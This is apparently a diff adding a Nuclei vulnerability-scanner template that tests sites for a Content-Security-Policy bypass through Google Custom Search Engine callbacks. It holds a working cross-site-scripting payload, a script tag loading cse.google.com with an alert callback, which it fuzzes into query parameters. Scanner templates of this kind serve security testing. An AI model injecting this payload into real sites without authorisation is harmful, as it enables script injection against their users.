@@ -1,0 +1,55 @@
+id: google-cse-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google CSE
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-cse
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_cse_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://cse.google.com/cse/element/v1?cx=000470283453218169915:hcrzdwsiwrc&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_cse_csp_xss == true"
+# digest: 4a0a0047304502202dd59af7847276d6505b9c32994d84c940c6f1fc2ffab27c993859014a9cb2cc022100bbabcbdb81e41435e8066b773d19b38bb5699a6ee4340779511eec8dda454465:922c64590222798bb761d5b6d8e72950
